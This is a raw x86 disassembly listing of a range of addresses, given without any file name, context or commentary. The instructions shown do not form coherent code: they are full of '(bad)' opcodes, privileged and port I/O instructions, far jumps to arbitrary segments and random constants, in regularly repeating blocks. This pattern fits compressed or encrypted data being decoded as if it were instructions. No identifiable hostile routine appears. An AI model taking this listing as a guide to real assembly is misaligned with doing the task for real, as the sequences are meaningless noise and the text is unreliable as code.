  429900:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429901:	xchg   al,ch
  429903:	mov    ds:0x49dd1060,al
  429908:	hlt    
  429909:	retf   
  42990a:	(bad)  
  42990b:	jns    0x429898
  42990d:	pop    es
  42990e:	push   esp
  42990f:	inc    esi
  429910:	pusha  
	...
  429971:	add    BYTE PTR [eax],al
  429973:	add    BYTE PTR [edi+0x68],dl
  429976:	fistp  QWORD PTR fs:[edi-0x21]
  42997a:	(bad)  
  42997b:	call   0x3b7e6d73
  429980:	fist   DWORD PTR [edx-0x42a0266c]
  429986:	add    DWORD PTR [eax],eax
  429988:	add    eax,0x1d000001
  42998d:	mov    ?,WORD PTR [ebx-0x73aa9d5]
  429993:	mov    ebp,0x60a4013a
  429998:	mov    al,ds:0x79482a26
  42999d:	pop    ecx
  42999e:	mov    WORD PTR ss:[ebx+0x6d299677],ss
  4299a5:	add    BYTE PTR [ebx],0xef
  4299a8:	aaa    
  4299a9:	pop    ebp
  4299aa:	push   0x5a
  4299ac:	retf   0xaeac
  4299af:	jnp    0x4299bf
  4299b1:	repz addr16 das 
  4299b4:	xchg   BYTE PTR [ebp-0x44a4d1a2],al
  4299ba:	in     eax,dx
  4299bb:	and    al,0xf7
  4299bd:	sbb    ebp,ecx
  4299bf:	push   edx
  4299c0:	ds ja  0x429976
  4299c3:	mov    ebp,0xc865ce83
  4299c8:	cmp    bh,BYTE PTR [ebp+0xa0d4f5]
  4299ce:	call   0x1ad7:0x13ec4ce0
  4299d5:	cmp    dl,BYTE PTR [ecx+0x5e4f2729]
  4299db:	outs   dx,DWORD PTR ds:[esi]
  4299dc:	fcom   DWORD PTR [ecx+0x5]
  4299df:	data16 mov dh,0x38
  4299e2:	or     DWORD PTR [eax],ebp
  4299e4:	in     eax,0x4d
  4299e6:	or     BYTE PTR [ebx-0x25],0xea
  4299ea:	arpl   si,ax
  4299ec:	ror    BYTE PTR [esi+0x7e],1
  4299ef:	stc    
  4299f0:	adc    DWORD PTR [ecx],ebp
  4299f2:	pop    eax
  4299f3:	call   0x426a:0x2aa710dd
  4299fa:	mov    bl,0x7
  4299fc:	shl    DWORD PTR [eax],0x85
  4299ff:	xor    eax,0xae88208a
  429a04:	or     ebx,DWORD PTR [ecx+ebp*2+0x6ea1829b]
  429a0b:	punpckhdq mm6,QWORD PTR [ebp+0x4fe10435]
  429a12:	mov    ds:0xa152bcb2,eax
  429a17:	pop    ss
  429a18:	xchg   edi,eax
  429a19:	test   eax,ebp
  429a1b:	push   0xbb27d4eb
  429a20:	aad    0xf8
  429a22:	inc    ecx
  429a23:	mov    ecx,0x39ae691d
  429a28:	and    BYTE PTR [edx+0x6],0xfb
  429a2c:	sub    esi,0x15f60c5f
  429a32:	mov    ds:0x1f4f43eb,al
  429a37:	xor    DWORD PTR [edx+0x6714153a],ebx
  429a3d:	dec    esp
  429a3e:	cmp    eax,0x92884d06
  429a43:	shl    cl,1
  429a45:	and    esi,esp
  429a47:	into   
  429a48:	lea    edi,[eax]
  429a4a:	mov    ebp,0xe5b378ca
  429a4f:	les    eax,FWORD PTR [eax+0x43e7b430]
  429a55:	ror    ebp,0x59
  429a58:	inc    edi
  429a59:	fwait
  429a5a:	dec    ebp
  429a5b:	push   edx
  429a5c:	mov    eax,0xd8f91806
  429a61:	xchg   ecx,eax
  429a62:	aaa    
  429a63:	sahf   
  429a64:	mov    al,0xb6
  429a66:	mov    eax,0x6a34ee50
  429a6b:	mov    ebx,DWORD PTR [ebx-0x52591c07]
  429a71:	dec    esi
  429a72:	mov    ecx,0x896e76ba
  429a77:	retf   
  429a78:	(bad)  
  429a79:	xchg   esp,eax
  429a7a:	cmp    ah,BYTE PTR [eax]
  429a7c:	inc    ebx
  429a7d:	cmp    DWORD PTR [eax+0x6c],esi
  429a80:	or     DWORD PTR [ebx],esi
  429a82:	popf   
  429a83:	push   cs
  429a84:	jns    0x429a8c
  429a86:	inc    ebp
  429a87:	scas   al,BYTE PTR es:[edi]
  429a88:	sub    edi,edi
  429a8a:	mov    ebx,gs
  429a8c:	in     al,dx
  429a8d:	mov    ebx,DWORD PTR [esi]
  429a8f:	cld    
  429a90:	sbb    eax,0x0
	...
  429af1:	add    BYTE PTR [eax],al
  429af3:	add    dh,cl
  429af5:	std    
  429af6:	sti    
  429af7:	leave  
  429af8:	sti    
  429af9:	iret   
  429afa:	(bad)  
  429afb:	jmp    DWORD PTR ds:0xeaa95667
  429b01:	loope  0x429ad8
  429b03:	add    DWORD PTR [esi+edi*4+0x1],esp
  429b07:	add    BYTE PTR ds:0x23000001,al
  429b0d:	dec    edi
  429b0e:	leave  
  429b0f:	hlt    
  429b10:	mov    ah,0xdf
  429b12:	stos   DWORD PTR es:[edi],eax
  429b13:	cdq    
  429b14:	out    0x8d,al
  429b16:	cmp    BYTE PTR [edi+0x1f],dl
  429b19:	fdivr  QWORD PTR [esi-0x62d85204]
  429b1f:	jno    0x429b76
  429b21:	test   eax,0x4e80acec
  429b26:	fdivr  DWORD PTR [ecx-0x6f]
  429b29:	and    BYTE PTR [esi-0x80c4503],0xbf
  429b30:	iret   
  429b31:	iret   
  429b32:	rcr    BYTE PTR [eax-0x2ee420b9],1
  429b38:	mov    ebp,0x788027bf
  429b3d:	xchg   esi,eax
  429b3e:	inc    edx
  429b3f:	xchg   edx,eax
  429b40:	cmp    dl,BYTE PTR [ebp-0x59]
  429b43:	pusha  
  429b44:	clc    
  429b45:	in     al,dx
  429b46:	push   ecx
  429b47:	push   eax
  429b48:	adc    cl,dl
  429b4a:	sbb    al,0x78
  429b4c:	and    eax,0xdc7510ba
  429b51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429b52:	loopne 0x429b23
  429b54:	push   ebx
  429b55:	adc    BYTE PTR [edx],al
  429b57:	add    ecx,DWORD PTR [ebx+0x3a]
  429b5a:	outs   dx,BYTE PTR ds:[esi]
  429b5b:	ret    0x8fc6
  429b5e:	mov    esp,0xbc1ba474
  429b63:	leave  
  429b64:	mov    eax,ds:0xef0e322
  429b69:	outs   dx,BYTE PTR ds:[si]
  429b6b:	repz sbb ecx,DWORD PTR ds:0x869dddc3
  429b72:	adc    ah,BYTE PTR [eax-0x43c68a8d]
  429b78:	mov    edi,0x6c29120c
  429b7d:	jmp    0x86af:0xf7b74786
  429b84:	inc    esi
  429b85:	mov    cs,WORD PTR [eax-0x47]
  429b88:	gs call 0x619f7625
  429b8e:	test   al,0x69
  429b90:	jge    0x429b2b
  429b92:	ins    DWORD PTR es:[edi],dx
  429b93:	xchg   edi,eax
  429b94:	mov    ch,0x23
  429b96:	mov    ds:0x2b82790e,eax
  429b9b:	inc    ecx
  429b9c:	xchg   edx,edi
  429b9e:	pop    esp
  429b9f:	rol    esi,0x50
  429ba2:	jns    0x429bea
  429ba4:	push   eax
  429ba5:	mov    cl,0xed
  429ba7:	pop    ss
  429ba8:	sub    eax,0xd9133ed7
  429bad:	out    dx,eax
  429bae:	call   0x1d70:0x23235b27
  429bb5:	cs out dx,eax
  429bb7:	jecxz  0x429bf7
  429bb9:	in     eax,dx
  429bba:	cld    
  429bbb:	or     al,0x47
  429bbd:	shl    BYTE PTR [ecx-0x11],0x13
  429bc1:	xchg   BYTE PTR [ecx],bh
  429bc3:	pop    ebx
  429bc4:	jno    0x429c11
  429bc6:	stc    
  429bc7:	sbb    esp,ebp
  429bc9:	retf   0x1d2f
  429bcc:	outs   dx,DWORD PTR ds:[esi]
  429bcd:	add    BYTE PTR [ecx+0x71],cl
  429bd0:	in     eax,dx
  429bd1:	adc    al,0xc5
  429bd3:	test   al,0xbe
  429bd5:	ret    0x1de3
  429bd8:	jmp    0x4bdc:0xd3ad9a56
  429bdf:	mov    DWORD PTR [ebp+0x397a9914],0x7a2f7971
  429be9:	jb     0x429c3f
  429beb:	call   0x291cf4cd
  429bf0:	dec    esp
  429bf1:	and    eax,0xe1608c26
  429bf6:	xlat   BYTE PTR ds:[ebx]
  429bf7:	add    ebx,esp
  429bf9:	cwde   
  429bfa:	push   edx
  429bfb:	cmc    
  429bfc:	dec    ebp
  429bfd:	gs sbb esp,DWORD PTR gs:[eax+0x37]
  429c02:	add    esp,DWORD PTR [edi+0x49]
  429c05:	es nop
  429c07:	(bad)  
  429c08:	mov    ebx,0xf333e915
  429c0d:	stc    
  429c0e:	pushf  
  429c0f:	icebp  
  429c10:	push   edx
	...
  429c71:	add    BYTE PTR [eax],al
  429c73:	add    BYTE PTR [ebx-0x487759ea],ah
  429c79:	mov    eax,0x89413faf
  429c7e:	(bad)  
  429c7f:	xor    BYTE PTR [ecx+0x5b],bh
  429c82:	mov    eax,ds:0x1bf69df
  429c87:	add    BYTE PTR ds:0x9c000001,al
  429c8d:	add    al,0xba
  429c8f:	inc    ebx
  429c90:	in     al,dx
  429c91:	sbb    ecx,0xffffffa6
  429c94:	xchg   esi,eax
  429c95:	stc    
  429c96:	outs   dx,BYTE PTR ds:[esi]
  429c97:	pusha  
  429c98:	mov    ch,0xe1
  429c9a:	push   edx
  429c9b:	xlat   BYTE PTR ds:[ebx]
  429c9c:	add    eax,0x910ed1e
  429ca1:	cmc    
  429ca2:	jns    0x429c6a
  429ca4:	sbb    eax,0x8f4cad75
  429ca9:	iret   
  429caa:	call   0x3b4c8e63
  429caf:	cmp    DWORD PTR [ebp+edx*4-0x12],ecx
  429cb3:	mov    ch,0x31
  429cb5:	int    0x57
  429cb7:	pusha  
  429cb8:	cmp    dh,BYTE PTR ds:0xd101d112
  429cbe:	ins    BYTE PTR es:[edi],dx
  429cbf:	sub    eax,0x5bc58d90
  429cc4:	and    DWORD PTR [edx-0x16d5b4d0],ecx
  429cca:	ret    0x4a9c
  429ccd:	into   
  429cce:	mov    al,al
  429cd0:	mov    esi,0x8ffce4a8
  429cd5:	push   esi
  429cd6:	inc    ebp
  429cd7:	xchg   ebp,eax
  429cd8:	mov    dh,0x1f
  429cda:	add    eax,0x44c16163
  429cdf:	xchg   ebp,eax
  429ce0:	je     0x429c8d
  429ce2:	add    eax,DWORD PTR [ecx+0x3a]
  429ce5:	loop   0x429d1b
  429ce7:	cli    
  429ce8:	int    0xbb
  429cea:	xor    eax,0x6e82fa7b
  429cef:	aas    
  429cf0:	nop
  429cf1:	(bad)  
  429cf2:	retf   0xfcbf
  429cf5:	mov    bh,0x7b
  429cf7:	fwait
  429cf8:	pop    esi
  429cf9:	pop    es
  429cfa:	add    bh,ah
  429cfc:	mov    esp,0x178d735
  429d01:	mov    eax,ds:0x453cf6e7
  429d06:	popa   
  429d07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429d08:	in     eax,dx
  429d09:	repnz xor eax,0x9c1d9bf1
  429d0f:	nop
  429d10:	loop   0x429d63
  429d12:	inc    esi
  429d13:	push   esp
  429d14:	jp     0x429cec
  429d16:	dec    ebx
  429d17:	mov    cl,0xb7
  429d19:	sbb    eax,0x65b38634
  429d1e:	lock cli 
  429d20:	repz dec eax
  429d22:	lahf   
  429d23:	(bad)  
  429d24:	test   al,0xfa
  429d26:	in     al,0x9b
  429d28:	(bad)  
  429d29:	arpl   WORD PTR cs:[ecx],bx
  429d2c:	and    al,0xc4
  429d2e:	not    DWORD PTR [edx-0x5c0f5a9]
  429d34:	dec    eax
  429d35:	xor    al,ah
  429d37:	sub    al,0x9b
  429d39:	loope  0x429cf4
  429d3b:	int3   
  429d3c:	popa   
  429d3d:	and    DWORD PTR [edi+edx*1-0x50],ebp
  429d41:	shr    DWORD PTR [esi+0x17],1
  429d44:	mov    dh,0x78
  429d46:	sti    
  429d47:	xchg   edi,eax
  429d48:	mov    cl,0x24
  429d4a:	bound  ebx,QWORD PTR [ebx]
  429d4c:	jmp    0x5bb2b34
  429d51:	fcomip st,st(0)
  429d53:	retf   0xe054
  429d56:	je     0x429db8
  429d58:	mov    ds:0xb93dfebe,eax
  429d5d:	xlat   BYTE PTR ds:[ebx]
  429d5e:	mov    esp,0xfcdc0d45
  429d63:	mov    BYTE PTR [eax],bl
  429d65:	adc    ebp,DWORD PTR [edx+eiz*2]
  429d68:	sbb    al,0xb6
  429d6a:	jo     0x429dc6
  429d6c:	bts    esi,esi
  429d6f:	dec    ebp
  429d70:	in     al,0xeb
  429d72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429d73:	scas   eax,DWORD PTR es:[edi]
  429d74:	sbb    bl,BYTE PTR [ebx-0x695ca1f7]
  429d7a:	jnp    0x429d25
  429d7c:	xchg   edi,eax
  429d7d:	pop    esp
  429d7e:	(bad)  
  429d7f:	and    eax,0xdad444e1
  429d84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429d85:	(bad)  
  429d86:	pop    ebx
  429d87:	jmp    0x35c06f0f
  429d8c:	and    DWORD PTR [ebx-0xa],esi
  429d8f:	je     0x429d74
	...
  429df1:	add    BYTE PTR [eax],al
  429df3:	add    BYTE PTR [ebx-0x13f33b49],bl
  429df9:	jg     0x429dd6
  429dfb:	mov    bh,0xe1
  429dfd:	sahf   
  429dfe:	loop   0x429e68
  429e00:	pop    ebx
  429e01:	mov    ch,0x89
  429e03:	mov    esp,0x1c06e
  429e08:	add    eax,0x5a000001
  429e0d:	mov    esi,0x459a0787
  429e12:	dec    edx
  429e13:	aam    0x49
  429e15:	das    
  429e16:	push   ds
  429e17:	and    dl,ch
  429e19:	daa    
  429e1a:	out    0x36,eax
  429e1c:	xchg   edi,eax
  429e1d:	pop    es
  429e1e:	dec    eax
  429e1f:	sbb    bl,bh
  429e21:	dec    edx
  429e22:	retf   0x6e83
  429e25:	mov    edi,0x1f843242
  429e2a:	(bad)  [edx-0x40]
  429e2d:	and    ebx,0x4a
  429e30:	(bad)  
  429e32:	add    al,0xf9
  429e34:	mov    ch,0xba
  429e36:	xchg   esp,eax
  429e37:	sbb    ebx,edi
  429e39:	(bad)  
  429e3a:	ins    DWORD PTR es:[edi],dx
  429e3b:	or     ebx,DWORD PTR [esi+0x49e82064]
  429e41:	push   esp
  429e42:	dec    edi
  429e43:	jns    0x429e21
  429e45:	jno    0x429dd0
  429e47:	dec    BYTE PTR [ecx]
  429e49:	mov    eax,ds:0x3c2d01ac
  429e4e:	xlat   BYTE PTR ds:[ebx]
  429e4f:	jne    0x429ec6
  429e51:	cmp    eax,0xd2e54fbc
  429e56:	and    BYTE PTR [ecx+edx*4+0x1ebd5844],0xac
  429e5e:	cmp    edx,ebp
  429e60:	push   ecx
  429e61:	ror    BYTE PTR [edx-0x14e2ed48],1
  429e67:	mov    edx,0x86914f39
  429e6c:	mov    bl,0x48
  429e6e:	pop    ebp
  429e6f:	in     eax,dx
  429e70:	cmp    DWORD PTR [edi+0x66],esp
  429e73:	outs   dx,BYTE PTR ds:[esi]
  429e74:	push   ds
  429e75:	push   ebx
  429e76:	xchg   esp,eax
  429e77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429e78:	xchg   ebx,eax
  429e79:	enter  0x40d7,0x52
  429e7d:	mov    eax,0x1b1cce21
  429e82:	outs   dx,BYTE PTR ds:[esi]
  429e83:	aaa    
  429e84:	adc    eax,0x784db9ac
  429e89:	cmp    esi,DWORD PTR [edx+0x4d]
  429e8c:	sub    DWORD PTR [ebp-0x3a],0xffffffe7
  429e90:	leave  
  429e91:	(bad)
  429e94:	sahf   
  429e95:	jmp    0xa850:0x336e6c35
  429e9c:	sub    esi,DWORD PTR [edx+edi*8]
  429e9f:	fwait
  429ea0:	lods   al,BYTE PTR ds:[esi]
  429ea1:	aaa    
  429ea2:	pop    edx
  429ea3:	mov    dl,0xce
  429ea5:	pop    ebp
  429ea6:	lds    edx,FWORD PTR [ebx]
  429ea8:	adc    dl,dl
  429eaa:	(bad)  
  429eab:	xchg   ecx,eax
  429eac:	(bad)  
  429ead:	sub    DWORD PTR [ebx-0x18],ebx
  429eb0:	shr    dl,0x3d
  429eb3:	dec    esi
  429eb4:	xchg   BYTE PTR [edi+0x79bc0b91],bh
  429eba:	fisub  DWORD PTR [eax+ebp*1+0x23]
  429ebe:	lods   eax,DWORD PTR ds:[esi]
  429ebf:	push   esp
  429ec0:	fist   DWORD PTR [eax]
  429ec2:	push   ss
  429ec3:	push   eax
  429ec4:	mov    ebx,0x2d932b1c
  429ec9:	sbb    eax,0x6b9c6619
  429ece:	push   cs
  429ecf:	inc    edi
  429ed0:	icebp  
  429ed1:	mov    eax,ds:0xedd22453
  429ed6:	loope  0x429f2b
  429ed8:	adc    BYTE PTR [esi-0x9aca23a],ch
  429ede:	jb     0x429f46
  429ee0:	arpl   WORD PTR [ebp-0x21586999],si
  429ee6:	sub    ecx,edi
  429ee8:	outs   dx,BYTE PTR ds:[esi]
  429ee9:	neg    esp
  429eeb:	fstp   TBYTE PTR [edx+ebx*2+0x2a20d5b0]
  429ef2:	call   0x5c4107a6
  429ef7:	xor    eax,0xda926d2d
  429efc:	(bad)  [esi+0x51]
  429eff:	cmp    edi,eax
  429f01:	in     al,0x60
  429f03:	inc    edi
  429f04:	cld    
  429f05:	jno    0x429f53
  429f07:	call   0x7c3f:0xe9c6ea99
  429f0e:	(bad)  
  429f10:	mov    es,WORD PTR [eax]
	...
  429f72:	add    BYTE PTR [eax],al
  429f74:	xor    DWORD PTR [ebp-0x38],eax
  429f77:	push   es
  429f78:	cld    
  429f79:	(bad)  
  429f7a:	push   DWORD PTR [edi-0x50]
  429f7d:	cld    
  429f7e:	sbb    esp,DWORD PTR [ebx-0x7c5316aa]
  429f84:	jae    0x429f47
  429f86:	add    DWORD PTR [eax],eax
  429f88:	add    eax,0xc8000001
  429f8d:	ds push ecx
  429f8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429f90:	iret   
  429f91:	xchg   edi,eax
  429f92:	cmp    eax,0x78df15bb
  429f97:	mov    dl,0x8a
  429f99:	rol    DWORD PTR [ebp+0xeea49b1],0x1a
  429fa0:	xor    eax,0xdbd90760
  429fa5:	ss xor ecx,eax
  429fa8:	or     ch,0x4a
  429fab:	xlat   BYTE PTR ds:[ebx]
  429fac:	dec    esp
  429fad:	mov    ebx,0x1f937f53
  429fb2:	and    edi,ebx
  429fb4:	pusha  
  429fb5:	cmp    al,0x18
  429fb7:	mov    ah,0xdc
  429fb9:	(bad)  
  429fbb:	int3   
  429fbc:	es cwde 
  429fbe:	movsx  eax,WORD PTR [esi]
  429fc1:	gs mov esi,0x503369bb
  429fc7:	scas   eax,DWORD PTR es:[edi]
  429fc8:	jmp    0x42a00c
  429fca:	stos   BYTE PTR es:[edi],al
  429fcb:	dec    ecx
  429fcc:	cld    
  429fcd:	push   esi
  429fce:	sub    bh,BYTE PTR [esp+edi*8]
  429fd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429fd2:	cli    
  429fd3:	in     al,0x9a
  429fd5:	jmp    0xf3d1:0x59d170a1
  429fdc:	ds mov dh,0x7d
  429fdf:	out    dx,al
  429fe0:	pop    ebx
  429fe1:	inc    esi
  429fe2:	pop    edi
  429fe3:	rol    BYTE PTR [ecx-0x1ddb0f2],0xd
  429fea:	jno    0x429f81
  429fec:	inc    edx
  429fed:	fadd   DWORD PTR [ecx+0xb62fb19]
  429ff3:	sbb    cl,BYTE PTR [edi]
  429ff5:	retf   0xcfd7
  429ff8:	das    
  429ff9:	stos   DWORD PTR es:[edi],eax
  429ffa:	pop    esi
  429ffb:	and    BYTE PTR [edx-0x15],0xc4
  429fff:	je     0x429f8c
  42a001:	mov    ah,0xcb
  42a003:	mov    esp,DWORD PTR [ebx]
  42a005:	pop    ecx
  42a006:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a007:	lods   eax,DWORD PTR ds:[esi]
  42a008:	jnp    0x42a076
  42a00a:	test   eax,0x8d7beabc
  42a00f:	(bad)  
  42a010:	sti    
  42a011:	mov    ebx,0x55cff39c
  42a016:	cwde   
  42a017:	mov    edx,edi
  42a019:	outs   dx,DWORD PTR ds:[esi]
  42a01a:	jne    0x42a094
  42a01c:	mov    ecx,0x3d81984f
  42a021:	jecxz  0x42a01c
  42a023:	sbb    eax,0xcb673c23
  42a028:	mov    ds:0xba74445e,al
  42a02d:	sub    ah,BYTE PTR [edi]
  42a02f:	xchg   DWORD PTR [edx],esi
  42a031:	scas   eax,DWORD PTR es:[edi]
  42a032:	shl    BYTE PTR [edi+edx*2+0x1a67d437],1
  42a039:	loope  0x42a0ad
  42a03b:	mov    cl,0x49
  42a03d:	cmp    al,bl
  42a03f:	sub    DWORD PTR [ecx],ecx
  42a041:	popf   
  42a042:	(bad)  
  42a044:	jne    0x42a021
  42a046:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a047:	or     BYTE PTR [esi-0x46eae789],0xb4
  42a04e:	hlt    
  42a04f:	dec    edi
  42a050:	jmp    0x4d0c:0xa5279f43
  42a057:	imul   ebx,DWORD PTR [edx-0x19],0x62
  42a05b:	mov    edi,0xf88d14db
  42a060:	cmp    al,0xb3
  42a062:	daa    
  42a063:	mov    eax,0x1bd9c6a9
  42a068:	ret    
  42a069:	cwde   
  42a06a:	arpl   WORD PTR [ebp+0x1f],bp
  42a06d:	or     al,BYTE PTR [ebp+ebx*1-0x509be03c]
  42a074:	ffreep st(4)
  42a076:	lahf   
  42a077:	std    
  42a078:	inc    edx
  42a079:	outs   dx,DWORD PTR ds:[esi]
  42a07a:	push   0x19f56e05
  42a07f:	js     0x42a026
  42a081:	pop    eax
  42a082:	aad    0x23
  42a084:	pushf  
  42a085:	js     0x42a0e4
  42a087:	test   al,0x7
  42a089:	test   esp,eax
  42a08b:	js     0x42a0e1
  42a08d:	mov    ds:0x3dba22,eax
	...
  42a0f2:	add    BYTE PTR [eax],al
  42a0f4:	xlat   BYTE PTR ds:[ebx]
  42a0f5:	pushf  
  42a0f6:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a0fd:	call   FWORD PTR [ebx]
  42a0ff:	(bad)  
  42a100:	in     al,dx
  42a101:	loop   0x42a139
  42a103:	jge    0x42a17d
  42a105:	ret    0x1
  42a108:	add    eax,0xd8000001
  42a10d:	call   DWORD PTR [esi-0x5a]
  42a110:	aad    0x9f
  42a112:	cli    
  42a113:	cs dec ebp
  42a115:	(bad)
  42a118:	ss dec ebp
  42a11a:	(bad)  [eax-0x26]
  42a11d:	in     eax,0x60
  42a11f:	shl    esp,0x7c
  42a122:	leave  
  42a123:	dec    edi
  42a124:	sub    esp,eax
  42a126:	sub    ah,cl
  42a128:	sub    al,bh
  42a12a:	out    0x1c,al
  42a12c:	xchg   esp,eax
  42a12d:	dec    ecx
  42a12e:	and    eax,0x9fc8bbb
  42a133:	xor    BYTE PTR [esi+0x7],0xca
  42a137:	add    BYTE PTR [eax-0x58],bl
  42a13a:	lds    ebx,FWORD PTR [eax-0x27]
  42a13d:	and    ah,dl
  42a13f:	inc    ebx
  42a140:	xor    ah,BYTE PTR [esi-0x42562a2]
  42a146:	add    al,0x8f
  42a148:	(bad)  
  42a149:	and    eax,0x944ed44
  42a14e:	scas   eax,DWORD PTR es:[edi]
  42a14f:	inc    ebp
  42a150:	push   cs
  42a151:	neg    DWORD PTR [edi-0x59a0b367]
  42a157:	xchg   edx,eax
  42a158:	bound  edi,QWORD PTR [eax-0x1a]
  42a15b:	add    dh,BYTE PTR [ecx]
  42a15d:	shl    BYTE PTR ds:0x7a3b2311,0xd6
  42a164:	lea    esi,[ebx+0x734ab94e]
  42a16a:	retf   
  42a16b:	not    edx
  42a16d:	jo     0x42a12e
  42a16f:	pop    ebp
  42a170:	out    dx,eax
  42a171:	dec    ebx
  42a172:	cli    
  42a173:	call   0x675b:0x7e19ca49
  42a17a:	and    DWORD PTR [esp+edx*8-0x74925078],edi
  42a181:	scas   eax,DWORD PTR es:[edi]
  42a182:	and    ebx,ebp
  42a184:	pop    ss
  42a185:	xchg   ebx,eax
  42a186:	(bad)  
  42a187:	jae    0x42a17b
  42a189:	js     0x42a194
  42a18b:	enter  0xbd2a,0xfa
  42a18f:	out    0x83,eax
  42a191:	leave  
  42a192:	shl    BYTE PTR [eax-0x3dda8a16],cl
  42a198:	or     BYTE PTR [eax-0x18],bh
  42a19b:	inc    eax
  42a19c:	adc    eax,0x2797c4e3
  42a1a1:	or     eax,DWORD PTR ds:0xd4520579
  42a1a7:	icebp  
  42a1a8:	or     DWORD PTR [ebx-0x125246b4],esp
  42a1ae:	in     eax,dx
  42a1af:	(bad)  
  42a1b0:	jb     0x42a1f1
  42a1b2:	xor    al,0x53
  42a1b4:	sahf   
  42a1b5:	dec    edx
  42a1b6:	popf   
  42a1b7:	jl     0x42a207
  42a1b9:	aad    0xad
  42a1bb:	jne    0x42a141
  42a1bd:	pop    sp
  42a1bf:	enter  0xaf77,0xb6
  42a1c3:	and    ebp,DWORD PTR [eax]
  42a1c5:	mov    ds:0x5ce8b06e,al
  42a1ca:	pop    edx
  42a1cb:	or     al,dh
  42a1cd:	cmp    al,0x3b
  42a1cf:	jl     0x42a241
  42a1d1:	add    eax,0xc9d2a809
  42a1d6:	repnz pop es
  42a1d8:	cmp    al,0x5b
  42a1da:	sti    
  42a1db:	jo     0x42a1bb
  42a1dd:	stc    
  42a1de:	or     al,0xc3
  42a1e0:	mov    esi,0xf8e8b68f
  42a1e5:	sbb    eax,0xd444cd4e
  42a1ea:	outs   dx,DWORD PTR ds:[esi]
  42a1eb:	mov    ds:0xb838af82,al
  42a1f0:	ja     0x42a1e8
  42a1f2:	fsub   QWORD PTR [eax]
  42a1f4:	jge    0x42a22d
  42a1f6:	or     ah,bl
  42a1f8:	out    0xe9,al
  42a1fa:	sbb    edi,DWORD PTR [edi+0x4b33bd40]
  42a200:	mov    cs,WORD PTR [eax+0x6060aad7]
  42a206:	inc    edi
  42a207:	imul   edi,edx,0x24
  42a20a:	mov    ebp,0x3c408a30
  42a20f:	pop    edi
  42a210:	push   ds
	...
  42a271:	add    BYTE PTR [eax],al
  42a273:	add    BYTE PTR [ebx],ch
  42a275:	test   DWORD PTR [ebp-0x50e640e7],edx
  42a27b:	mov    bh,0x1a
  42a27d:	aas    
  42a27e:	scas   al,BYTE PTR es:[edi]
  42a27f:	fldcw  WORD PTR [ebp-0x25]
  42a282:	add    bl,bh
  42a284:	jge    0x42a249
  42a286:	add    DWORD PTR [eax],eax
  42a288:	add    eax,0x45000001
  42a28d:	dec    ebx
  42a28e:	loope  0x42a295
  42a290:	outs   dx,BYTE PTR ds:[esi]
  42a291:	iret   
  42a292:	xchg   ebx,eax
  42a293:	jno    0x42a25e
  42a295:	add    BYTE PTR [eax+0x34],dh
  42a298:	scas   eax,DWORD PTR es:[edi]
  42a299:	test   DWORD PTR [edx+0x89a5af],0xd7834da9
  42a2a3:	xchg   esi,eax
  42a2a4:	es push ebp
  42a2a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a2a7:	ror    DWORD PTR ds:0x55d5ca68,cl
  42a2ad:	inc    edx
  42a2ae:	fdivr  QWORD PTR [esi+0x59227049]
  42a2b4:	stc    
  42a2b5:	or     DWORD PTR [ecx-0x14b2b659],0xffffffee
  42a2bc:	mov    esi,0x5e9716
  42a2c1:	test   DWORD PTR [edx+edx*8],ebx
  42a2c4:	iret   
  42a2c5:	sub    edi,DWORD PTR gs:[eax]
  42a2c8:	lods   eax,DWORD PTR ds:[esi]
  42a2c9:	sbb    edx,esi
  42a2cb:	push   ecx
  42a2cc:	and    al,0x1b
  42a2ce:	mov    ecx,0x621c9ef7
  42a2d3:	or     dl,0xf7
  42a2d6:	sbb    esi,DWORD PTR [edx+0xc]
  42a2d9:	outs   dx,DWORD PTR ss:[esi]
  42a2db:	ss pop eax
  42a2dd:	sub    BYTE PTR ds:0x60ef5679,ah
  42a2e3:	jo     0x42a2c2
  42a2e5:	add    BYTE PTR [eax],dh
  42a2e7:	push   ss
  42a2e8:	fidivr WORD PTR [edx]
  42a2ea:	outs   dx,BYTE PTR ds:[esi]
  42a2eb:	mov    ch,ch
  42a2ed:	cmp    ebx,edx
  42a2ef:	or     DWORD PTR [eax+0x45f1734b],0xffffff8c
  42a2f6:	clc    
  42a2f7:	inc    esi
  42a2f8:	and    al,0x50
  42a2fa:	test   DWORD PTR [edx],esp
  42a2fc:	mov    fs,WORD PTR [eax-0x2e34bdc1]
  42a302:	inc    esi
  42a303:	push   esi
  42a304:	test   eax,0x69d68ccf
  42a309:	dec    eax
  42a30a:	aad    0x90
  42a30c:	push   ss
  42a30d:	adc    ecx,ebp
  42a30f:	xor    eax,0x2b3397fc
  42a314:	ret    
  42a315:	je     0x42a342
  42a317:	stos   DWORD PTR es:[edi],eax
  42a318:	cli    
  42a319:	jp     0x42a340
  42a31b:	sbb    al,0x25
  42a31d:	jmp    0x42a359
  42a31f:	ja     0x42a35a
  42a321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a322:	adc    al,0xa1
  42a324:	xor    bl,BYTE PTR [edx]
  42a326:	ss sti 
  42a328:	scas   al,BYTE PTR es:[edi]
  42a329:	or     eax,0x56adc23d
  42a32e:	stos   DWORD PTR es:[edi],eax
  42a32f:	loop   0x42a35e
  42a331:	cmp    eax,0x141384b
  42a336:	cmc    
  42a337:	or     ah,al
  42a339:	fs xchg ecx,eax
  42a33b:	xchg   edi,eax
  42a33c:	or     edi,DWORD PTR [ebx+edx*1]
  42a33f:	xor    BYTE PTR [eax+0x1924204c],0x19
  42a346:	adc    al,BYTE PTR [eax-0x6665bb57]
  42a34c:	push   0x8d88b979
  42a351:	and    DWORD PTR [edx+0x521c37f7],0xffffffdb
  42a358:	fsin   
  42a35a:	(bad)  
  42a35b:	(bad)  
  42a35c:	pop    esi
  42a35d:	lea    ebp,[edx-0x1d242b3d]
  42a363:	retf   0x752c
